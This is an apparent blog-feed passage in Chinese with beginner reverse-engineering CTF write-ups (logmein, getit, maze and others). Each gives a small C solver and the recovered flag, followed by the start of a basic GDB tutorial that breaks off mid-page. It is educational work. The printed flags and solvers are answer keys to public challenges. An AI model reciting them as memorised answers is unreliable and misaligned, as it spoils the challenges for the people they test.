class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>0F<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>10&quot;;<br>unsigned char v2[] = &quot;<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>6C<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>7C<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>7D<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>7C<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>4A<span class="hljs-symbol">\x</span>31&quot;<br>&quot;<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>6C<span class="hljs-symbol">\x</span>5E<span class="hljs-symbol">\x</span>6C<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>2C<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>5F<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>65&quot;<br>&quot;<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>7F<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>6B<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>5C<span class="hljs-symbol">\x</span>1D<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>6B<span class="hljs-symbol">\x</span>5A<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>0C&quot;<br>&quot;<span class="hljs-symbol">\x</span>2B<span class="hljs-symbol">\x</span>4C<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>7E&quot;;<br>for (int i = 0; i &lt; 56; i++)<br>&#123;<br>v2[i] = v2[i] ^ 0x13;<br>v2[i] = v2[i] ^ v5[i];<br>&#125;<br>printf(&quot;<span class="hljs-variable">%s&quot;, v2);</span><br><span class="hljs-variable">&#125;</span><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/17.png"></p><blockquote><p>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p></blockquote><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>打开题目是一个C的源代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;        <span class="hljs-comment">//参数为4个</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;what?\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> first = atoi(argv[<span class="hljs-number">1</span>]); <br>    <span class="hljs-keyword">if</span> (first != <span class="hljs-number">0xcafe</span>) &#123;     <span class="hljs-comment">//第一个参数atoi后为0xcafe、51966</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are wrong, sorry.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> second = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">if</span> (second % <span class="hljs-number">5</span> == <span class="hljs-number">3</span> || second % <span class="hljs-number">17</span> != <span class="hljs-number">8</span>) &#123;<span class="hljs-comment">//第二个参数 除以5 余数不能是3，除以17余数要等于8</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;h4cky0u&quot;</span>, argv[<span class="hljs-number">3</span>])) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;so close, dude!\n&quot;</span>);    <span class="hljs-comment">//第三个参数，等于h4cky0u</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Brr wrrr grr\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> hash = first * <span class="hljs-number">31337</span> + (second % <span class="hljs-number">17</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]) - <span class="hljs-number">1615810207</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get your key: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, hash);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>根据源码分析可以知道需要输入三个参数，三个参数满足条件后就会输出flag。</p><ul><li>第一个参数是<code>51966</code></li><li>第二个参数除以5 余数不能是3，除以17余数要等于8</li><li>第三个参数，等于<code>h4cky0u</code></li></ul><p>根据条件求第二个参数，有很多，选择其中一个</p><p>python：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">if</span>(i % <span class="hljs-number">5</span> != <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> i % <span class="hljs-number">17</span> == <span class="hljs-number">8</span>):<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/18.png"></p><p>得到flag</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/19.png"></p><blockquote><p>c0ffee</p></blockquote><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><p>查壳，可以看到是UPX的壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/21.png"></p><p>直接使用<code>upx-d</code>脱壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/20.png"></p><p>使用IDA打开，直接看到flag</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/22.png"></p><blockquote><p>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</p></blockquote><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><h3 id="详细分析-3"><a href="#详细分析-3" class="headerlink" title="详细分析"></a>详细分析</h3><p>64位elf文件，无壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/23.png"></p><p>使用IDA打开。可以明显的看到具体的比较地方，和flag生成的方式。&amp;v7+i%v6，其中v6是7，也就是&amp;v7+i%7，将v7转换为字符，一共就是七个，而i取7的余数，这里就是在不断的获取v7的每一位来与v8进行异或。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/24.png"></p><h3 id="注册机-3"><a href="#注册机-3" class="headerlink" title="注册机"></a>注册机</h3><p>根据上面的分析写出注册机</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a[] = <span class="hljs-string">&quot;\x68\x61\x72\x61\x6D\x62\x65&quot;</span>;<br>    <span class="hljs-keyword">char</span> flag[] = <span class="hljs-string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); i++)<br>    &#123;<br>        flag[i] = flag[i] ^ (a[i % <span class="hljs-number">7</span>]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/25.png"></p><blockquote><p>RC3-2016-XORISGUD</p></blockquote><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><p>查壳，无壳，32位elf文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/26.png"></p><p>使用IDA打开，分析发现关键函数是<code>authenticate</code></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/27.png"></p><p>看到输入被曝存在ws之中，然后<code>wcscmp</code>会比较s2和ws，s2是经过<code>decrypt</code>函数生成的。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/28.png"></p><p>查看具体的算法，看到是非常简单的减法。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/29.png"></p><p>数据为图中框起来的数据循环的减去1-5这几个数（因为都带着0x14，所以直接可以去掉0x14的）</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/30.png"></p><h3 id="注册机-4"><a href="#注册机-4" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">int main() &#123;<br>    unsigned char s[] = &quot;<span class="hljs-symbol">\x</span>3A<span class="hljs-symbol">\x</span>36<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>3B<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>7A<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>6B<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>78&quot;<br>                        &quot;<span class="hljs-symbol">\x</span>6A<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>6A<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>80&quot;;<br>    int a[] = &#123; 1,2,3,4,5 &#125;;<br>    for (int i = 0; i &lt; 38; i++)<br>    &#123;<br>        s[i] -= a[i <span class="hljs-variable">% 5];</span><br><span class="hljs-variable">    &#125;</span><br><span class="hljs-variable">    printf(&quot;%</span>s&quot;, s);<br>    return 0;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/31.png"></p><blockquote><p>9447{you_are_an_international_mystery}</p></blockquote><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>无壳，64位ELF文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/33.png"></p><p>使用IDA打开，看到主要的流程是打开/tmp/flag.txt，然后向其中写入一些东西，但是最后又调用<code>remove</code>函数将其删除，所以是不可能查看flag.txt的，那么就看一下其写入的数据。看图中框选起来的部分可以看到，将s数组的每一位通过+1或者-1放在了t的十位以后的位置。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/32.png"></p><p>查看s与t</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/34.png"></p><h3 id="注册机-5"><a href="#注册机-5" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> flag[] = <span class="hljs-string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>;<br>    <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>)<br>        &#123;<br>            flag[i] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            flag[i] -= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SharifCTF&#123;%s&#125;&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/35.png"></p><blockquote><p>SharifCTF{b70c59275fcfa8aebf2d5911223c6589}</p></blockquote><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h3 id="详细分析-4"><a href="#详细分析-4" class="headerlink" title="详细分析"></a>详细分析</h3><p>查壳，无壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/36.png"></p><p>直接运行程序，看到会弹出一个窗口，但是其中都是乱码根本不可读</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/38.png"></p><p>使用IDA打开，看到lpMem就是那段乱码，正常流程都是弹窗显示这串字符，注意到<code>sub_401000</code>函数，其传入了参数lpMem</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/37.png"></p><p>在其中对于lpMem进行了操作，可以看到主要是异或，并且四个字符作为一组来进行异或。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/39.png"></p><p>原始数据以及异或用的KEY</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/40.png"></p><h3 id="注册机-6"><a href="#注册机-6" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">int main() &#123;<br>    unsigned char a[] = &quot;<span class="hljs-symbol">\x</span>BB<span class="hljs-symbol">\x</span>AA<span class="hljs-symbol">\x</span>CC<span class="hljs-symbol">\x</span>DD&quot;;<br>    unsigned char flag[] = &quot;<span class="hljs-symbol">\x</span>BB<span class="hljs-symbol">\x</span>CC<span class="hljs-symbol">\x</span>A0<span class="hljs-symbol">\x</span>BC<span class="hljs-symbol">\x</span>DC<span class="hljs-symbol">\x</span>D1<span class="hljs-symbol">\x</span>BE<span class="hljs-symbol">\x</span>B8<span class="hljs-symbol">\x</span>CD<span class="hljs-symbol">\x</span>CF<span class="hljs-symbol">\x</span>BE<span class="hljs-symbol">\x</span>AE<span class="hljs-symbol">\x</span>D2<span class="hljs-symbol">\x</span>C4<span class="hljs-symbol">\x</span>AB<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>D2<span class="hljs-symbol">\x</span>D9<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>B3<span class="hljs-symbol">\x</span>D4<span class="hljs-symbol">\x</span>DE<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>A9<span class="hljs-symbol">\x</span>D3<span class="hljs-symbol">\x</span>CB<span class="hljs-symbol">\x</span>B8<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>D3<span class="hljs-symbol">\x</span>CB<span class="hljs-symbol">\x</span>BE<span class="hljs-symbol">\x</span>B9&quot;<br>        &quot;<span class="hljs-symbol">\x</span>9A<span class="hljs-symbol">\x</span>D7<span class="hljs-symbol">\x</span>CC<span class="hljs-symbol">\x</span>DD&quot;;<br>    for (int i = 0; i &lt; 36; i++)<br>    &#123;<br>        flag[i] = flag[i] ^ a[i<span class="hljs-variable">%4];</span><br><span class="hljs-variable">        printf(&quot;%</span>c&quot;, flag[i]);<br>    &#125;<br>    return 0;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/41.png"></p><blockquote><p>flag{reversing_is_not_that_hard!}</p></blockquote><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>无壳，64位的elf文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/42.png"></p><p>限制是必须是输入24位，前五位是“nctf{”，最后一位是“}”</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/49.png"></p><p>看到最终成功的条件是，一系列操作之后<code>asc_601060[8 * v9 + v10[0]]</code>中的值正好等于”#”，</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/43.png"></p><p>查看前面的流程，看到对于上面这个数组的位移来说，输入<code>O</code>是-1，<code>o</code>是+1，<code>.</code>是-8，<code>0</code>是+8</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/44.png"></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/45.png"></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/46.png"></p><p>此数组，也就是说是一个8*8的迷宫，需要走到”#”的位置。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/47.png"></p><p>如图中这样的迷宫，这样走可以走到“#”，然后带入前面的几个走的字符，得到flag</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/48.png"></p><blockquote><p>nctf{o0oo00O000oooo..OO}</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>攻防世界writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CTF</tag>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB学习--基本操作</title>
    <link href="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/10/29/GDB%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下学习GDB的一些东西，也不是所有的完全指令，主要还是一些日常用的。</p><p>在这里记录了一些比较全的命令，随时可以查看这里</p><p><a href="https://github.com/evilpan/awesome-cheatsheets/blob/master/tools/gdb.txt">https://github.com/evilpan/awesome-cheatsheets/blob/master/tools/gdb.txt</a></p><h2 id="GDB的一些命令"><a href="#GDB的一些命令" class="headerlink" title="GDB的一些命令"></a>GDB的一些命令</h2><p>先写一个小DEMO用来后面的GDB调试</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x,<span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> x+y;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> x=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">int</span> y=<span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sum is %d\n&quot;</span>,<span class="hljs-built_in">add</span>(x,y));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>输入命令gdb，就可以打开gdb了，如图是gdb的界面。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/1.png"></p><p>先列出一些gdb的常用指令。</p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>run-r</td><td>运行程序，如果碰到断点的话就会停下来</td></tr><tr><td>break-b</td><td>设置断点</td></tr><tr><td>help-h</td><td>帮助菜单</td></tr><tr><td>step-s</td><td>单步步进，就是OD里的F7</td></tr><tr><td>next-n</td><td>单步步过，也就是OD里的F8</td></tr><tr><td>finish-fin</td><td>执行程序直到指定的栈帧返回，也就是调用了一个函数，执行到retn再执行retn</td></tr><tr><td>print-p</td><td>打印一些信息</td></tr><tr><td>quit-q</td><td>退出</td></tr></tbody></table><h2 id="GDB操作"><a href="#GDB操作" class="headerlink" title="GDB操作"></a>GDB操作</h2><p>打开gdb之后，输入file + 文件名 即可将文件附加进去。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/2.png"></p><p>输入<code>start</code>命令可以停在main函数处，与<code>run</code>命令的区别是，后者是运行碰到断点停下，前者是停在main函数处。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/3.png"></p><h3 id="断点类"><a href="#断点类" class="headerlink" title="断点类"></a>断点类</h3><p><code>break</code>指令可以下断点，快捷是b，不带任何参数时，是在所选栈帧中执行的下一条指令处下断。</p><p><code>b func</code>：对函数下断，如图对main和add函数下断。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/4.png"></p><p><code>b line</code>：在当前源代码的指定行下断。</p><p><code>b file:line</code>：在源码文件的line行处下断。</p><p><code>b file:function</code>：在源码文件的function处下断。</p><p><code>b *addr</code>：在程序指定地址处下断。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/5.png"></p><p><code>info breakpoints</code>：可以列出当前所有的断点信息，快捷<code>i b</code></p><p><code>delete num</code>：删除指定编号的断点。</p><p><code>clear function</code>：删除指定函数的断点</p><p><code>delete</code>：删除所有断点</p><p><img 